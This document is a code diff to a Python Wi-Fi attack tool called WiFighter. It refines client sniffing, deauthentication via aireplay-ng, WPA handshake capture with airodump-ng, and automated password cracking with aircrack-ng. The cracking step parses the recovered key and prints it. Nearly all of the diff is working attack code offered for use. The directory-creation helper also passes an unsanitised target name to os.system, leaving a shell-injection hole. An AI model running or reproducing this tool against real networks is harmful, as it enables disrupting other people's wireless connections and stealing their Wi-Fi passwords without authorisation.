@@ -40,11 +40,11 @@ attack_list = ['Handshake Crack', 'WPS Crack']
 deauth_modes = ['Client deauth', 'Broadcast', 'Silent']
 
 wifi_networks = []
-sniffed_clients = []
 interface = None
 target_ap = None
 attack = None
 attack_mode = None
+sniffed_clients = []
 
 # Get the full path of wifighter dir
 wifighter_path = os.path.dirname(os.path.abspath(__file__))
@@ -72,6 +72,19 @@ def logo():
      print(f"{BLUE}{LOGO}{RESET}")
      print()
      print()
+
+#---------------------------------
+
+ # | Global Functions | #
+
+def create_cap_dir(target, output_dir):
+          if target:
+               if os.path.exists(output_dir):
+                    pass
+               else:
+                    print(f"Creating capture directory -> WiFighter/attacks/{target.replace(' ', '_')}")
+                    os.system(f'mkdir {output_dir}')
+                    print()  
 
 #---------------------------------
 
@@ -149,9 +162,8 @@ def monitor_switch(verbose, command, interface):
           elif command == "stop":
                if verbose:
                     print(f'{CYAN}Interface {interface} is already in Managed Mode, skipping...{RESET}')              
-     else:
-          if verbose:
-               print(f'{RED}Interface "{interface}" does not exist! Retype "wifighter [start/stop/status] [-INTERFACE_NAME-]"{RESET}')
+     elif verbose:
+          print(f'{RED}Interface "{interface}" does not exist! Retype "wifighter [start/stop/status] [-INTERFACE_NAME-]"{RESET}')
 
 
 def list_interfaces():
@@ -183,7 +195,6 @@ def choose_interface():
      print(f"{CYAN}| Select Interface |{RESET}")
      print()
 
-     #print(f"Select Wi-Fi Interface:")
      for interface in detected_interfaces:
           print(f"{idx}. {interface}")
           idx += 1
@@ -231,7 +242,7 @@ def choose_attack(target_ap):
 
      print(f'{CYAN}| Select Attack |{RESET}')
      print()
-     target_ap = target_ap['BSSID'] + ' -> ' + target_ap['SSID'] if target_ap['SSID'] else target_ap['BSSID']
+     target_ap = f"{target_ap['SSID']} ({target_ap['BSSID']})" if target_ap['SSID'] else target_ap['BSSID']
      print(f'Select attack on {target_ap}')
 
      idx = 1
@@ -434,7 +445,7 @@ def list_ap(wifi_networks):
 
  #------------------------------------------------------------------------------------
 
-# | Attacks | #
+# | Handshake Crack | #
 
 def sniff_clients(interface, target_ap):
      clients = set()
@@ -443,32 +454,30 @@ def sniff_clients(interface, target_ap):
             # Check if the packet is a data frame and from/to the target BSSID
             if pkt.type == 2 and (pkt.addr2 == target_ap or pkt.addr1 == target_ap):
                 if pkt.addr2 == target_ap and pkt.addr1 not in clients and pkt.addr1.lower() != 'ff:ff:ff:ff:ff:ff':
-                    clients.add(pkt.addr1)
-                    #print(f"Client MAC Address: {pkt.addr1}")
+                    client = f'{pkt.addr2} -> {pkt.addr1}' # AP MAC -> Client MAC
+                    clients.add(client)
                 elif pkt.addr1 == target_ap and pkt.addr2 not in clients and pkt.addr2.lower() != 'ff:ff:ff:ff:ff:ff':
-                    clients.add(pkt.addr2)
-                    #print(f"Client MAC Address: {pkt.addr2}")
-  
-     # Start sniffing on the specified interface
-     sniff(iface=interface, prn=packet_handler, timeout=10)  # Adjust timeout as needed
-
+                    client = f'{pkt.addr1} -> {pkt.addr2}' # AP MAC -> Client MAC
+                    clients.add(client)
+     #print('Start sniffing')
+     sniff(iface=interface, prn=packet_handler, timeout=10)  # Start sniffing on the specified interface
+     #print('Stop sniffing')
      return list(clients)
-        
-
-def list_clients(sniffed_clients):
+def list_clients(sniffed_clients, ssid, bssid):
      # Create AP table
      table = PrettyTable()
-     table.field_names = ["ID", "Client MAC"]
+     table.field_names = ["ID", "AP MAC -> Client MAC"]
      for idx, client_mac in enumerate(sniffed_clients):
           table.add_row([
                f"{idx}",
                client_mac or "N/A"
           ])
-
-     print(f"{CYAN}| Client Scan |{RESET}")
+     if ssid:
+          print(f"{CYAN}| {ssid}'s ({bssid}) Clients |{RESET}")
+     else:
+          print(f"{CYAN}| {bssid} Clients |{RESET}")
      print(f"{MAGENTA}{table}{RESET}")
      print("\nPress [Ctrl + C] to stop")
-
 def choose_target_client():
      global sniffed_clients
      try:
@@ -497,26 +506,26 @@ def handshake_crack(target_ap, interface, deauth_mode):
      deauth_mode = deauth_mode.lower()
      target_client = None
 
-     monitor_switch(None, 'start', interface) # Make sure interface is in Monitor
-     stop_services(None) # Make sure interfering services are not running
-
      # Set deauth client if needed
      if deauth_mode == 'client deauth' and not target_client:
           global sniffed_clients
+          logo()
+          print(f"{CYAN}[>]{RESET} Sniffing for {target}'s clients...")
           try:
                while True:
                     # Get available AP's
                     sniff_output = sniff_clients(interface, bssid) # Get output array from iw
+                    #print(sniff_output)
                     if sniff_output and isinstance(sniff_output, list):
                          sniffed_clients = sniff_output 
                     if sniffed_clients:
                          logo()
-                         print(sniffed_clients)
-                         list_clients(sniffed_clients) # Show available clients's in table
-                    time.sleep(5)
+                         list_clients(sniffed_clients, ssid, bssid) # Show available clients's in table
+                    time.sleep(3)
           except KeyboardInterrupt:
                if sniffed_clients:
-                    target_client = choose_target_client() # Let user choose client as target
+                    # Let user choose client as target
+                    target_client = choose_target_client().split('->')[1].strip() # Cut of the "AP MAC ->"" from the string
                else:
                     print(f"\n\n{RED}No clients found, exiting...{RESET}\n")
 
@@ -533,16 +542,7 @@ def handshake_crack(target_ap, interface, deauth_mode):
 
           for filename in new_files:
                if '.cap' in filename:
-                    return filename  
-
-     def create_cap_dir(target):
-          if target:
-               if os.path.exists(output_dir):
-                    pass
-               else:
-                    print(f"Creating capture directory -> WiFighter/attacks/{target.replace(' ', '_')}")
-                    os.system(f'mkdir {output_dir}')
-                    print()       
+                    return filename       
 
      def kill_airodump_processes():
           for proc in psutil.process_iter(['pid', 'name']):
@@ -591,11 +591,11 @@ def handshake_crack(target_ap, interface, deauth_mode):
      else:
           print(f'Attacking on {bssid} with {interface}...')
 
-     create_cap_dir(target) # Create capture dir if not exist
+     create_cap_dir(target, output_dir) # Create capture dir if not exist
 
      # Define processes
      capture_handshake = multiprocessing.Process(target = run_airodump, args=(interface, bssid, channel, output_dir))
-     deauth_client = multiprocessing.Process(target = run_aireplay, args=(interface, bssid, target_client, deauth_mode))
+     deauth_clients = multiprocessing.Process(target = run_aireplay, args=(interface, bssid, target_client, deauth_mode))
 
      files_before = list_files(output_dir) # Get files before airodump-ng adds new
 
@@ -605,8 +605,8 @@ def handshake_crack(target_ap, interface, deauth_mode):
 
      # Deauth client/s if selected
      if deauth_mode != 'silent':
-          deauth_client.start() # Start aireplay-ng process
-          deauth_client.join() # Wait for the process to stop
+          deauth_clients.start() # Start aireplay-ng process
+          deauth_clients.join() # Wait for the process to stop
 
      files_after = list_files(output_dir) # Get files after airodump-ng adds new
      output_file = cap_file(files_before, files_after) # Determine output_file in which airodump-ng stores
@@ -633,17 +633,34 @@ def handshake_crack(target_ap, interface, deauth_mode):
                end_time = time.time() # End deauth timer
                elapsed_time = end_time - start_time
                elapsed_time = int(elapsed_time) # Get elapsed time before last deauth
-               if elapsed_time >= 17:
-                    deauth_client = multiprocessing.Process(target = run_aireplay, args=(interface, bssid, target_client, deauth_mode))
-                    deauth_client.start() # Start aireplay-ng process
-                    deauth_client.join() # Wait for the process to stop
+               if elapsed_time >= 20:
+                    deauth_clients = multiprocessing.Process(target = run_aireplay, args=(interface, bssid, target_client, deauth_mode))
+                    deauth_clients.start() # Start aireplay-ng process
+                    deauth_clients.join() # Wait for the process to stop
                     start_time = time.time() # Reset deauth timer
 
           time.sleep(1)
 
      kill_airodump_processes() # Kill all airodump-ng processes
      
-     os.system(f"sudo aircrack-ng -w wordlist.txt {output_dir}/{output_file}") # Crack password
+     # Try cracking the password
+     try:
+          print(f"{CYAN}[>]{RESET} Cracking handshake with wordlist.txt")
+          command = ['sudo', 'aircrack-ng', '-w', 'wordlist.txt', f'{output_dir}/{output_file}']
+          crack = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+          output = str(crack.communicate())
+
+          if 'KEY FOUND!' in output:
+               #print(output)
+               password_pattern = r'KEY FOUND!\s* \[\s*(.+?)\s*\]'
+               password_match = re.search(password_pattern, output) # Search for the pattern in the output string
+
+               # Extract and print the key if found
+               if password_match:
+                    password = password_match.group(1)
+                    print(f"\n{YELLOW}[>]{RESET} Password cracked! [ {password} ]\n")
+     except KeyboardInterrupt:
+          pass
 
 
 #------------------------------------------------------------------------------------
@@ -720,6 +737,8 @@ else:
      
      # Run attacks
      if attack:
+          monitor_switch('verbose', 'start', interface) # Make sure interface is in Monitor
+          stop_services('verbose') # Make sure interfering services are not running
           logo()
           if attack == 'Handshake Crack':
                deauth_mode = choose_deauth_mode()
@@ -734,8 +753,9 @@ else:
      
 
      # On tool end turn everything back on
-     try:
-          monitor_switch('verbose', 'stop', interface)
-     except KeyboardInterrupt:
-          print(f"\n\n{BLUE}Exiting the tool...{RESET}")
+     if interface:
+          try:
+               monitor_switch(None, 'stop', interface)
+          except KeyboardInterrupt:
+               print(f"\n\n{BLUE}Exiting the tool...{RESET}")
      
